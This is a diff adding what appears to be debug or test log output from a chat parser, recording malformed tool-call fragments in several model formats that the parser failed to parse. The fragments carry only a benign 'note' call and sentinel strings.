@@ -1,0 +1,3982 @@
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+<|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+<|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: 
+    <|tool_call_begin|>functions.note:0<|tool_call_argument_begin|>{"text": "save this"}<|tool_call_end|>
+  <|tool_calls_section_end|>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think><｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think>HEAD
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <think></think></think>
+
+<｜DSML｜function_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜function_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter> TAIL_SENTINEL</｜DSML｜parameter>
+</｜DSML｜invoke>
+</｜DSML｜tool_calls>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+JUNK_BETWEEN_SENTINEL
+<｜DSML｜invoke name="ping"/>
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls>
+<｜DSML｜invoke name="note">
+<｜DSML｜parameter name="text" string="true">save this</｜DSML｜parameter>
+</｜DSML｜invoke>
+TAIL_SENTINEL
+</｜DSML｜tool_calls>
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <｜DSML｜tool_calls></｜DSML｜tool_calls>   
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+TAIL_SENTINEL
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
+{"name": "note", "arguments": {"text": "save this"}</tool_call> TAIL_SENTINEL</tool_call>
+TAIL2
+common_chat_peg_parse: unparsed peg-native output: <tool_call>
